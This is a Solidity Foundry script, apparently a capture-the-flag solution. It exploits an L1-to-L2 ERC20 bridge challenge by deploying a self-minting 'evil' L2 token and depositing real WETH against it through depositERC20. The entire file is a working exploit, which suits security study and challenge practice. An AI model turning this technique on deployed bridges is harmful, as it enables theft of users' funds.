pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

import "src/L1/WETH.sol";
import "src/L1/IL1ERC20Bridge.sol";
import "src/L2/standards/L2StandardERC20.sol";
import "src/Challenge.sol";

contract ExploitDeposit is Script {
    function setUp() public {}

    function run() public {
        vm.createSelectFork(vm.envString("L1_RPC"));
        Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
        WETH weth = WETH(payable(challenge.WETH()));

        vm.createSelectFork(vm.envString("L2_RPC"));
        vm.broadcast();
        L2EvilToken eviltoken = new L2EvilToken(address(weth));

        vm.createSelectFork(vm.envString("L1_RPC"));
        vm.startBroadcast();
        IL1ERC20Bridge l1Bridge = IL1ERC20Bridge(challenge.BRIDGE());
        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), address(eviltoken), 2 ether);
        vm.stopBroadcast();
    }
}

contract L2EvilToken is L2StandardERC20 {
    constructor(address _l1Token) L2StandardERC20(_l1Token, "MyToken", "MTK") {
        _mint(msg.sender, 2 ether);
    }
}
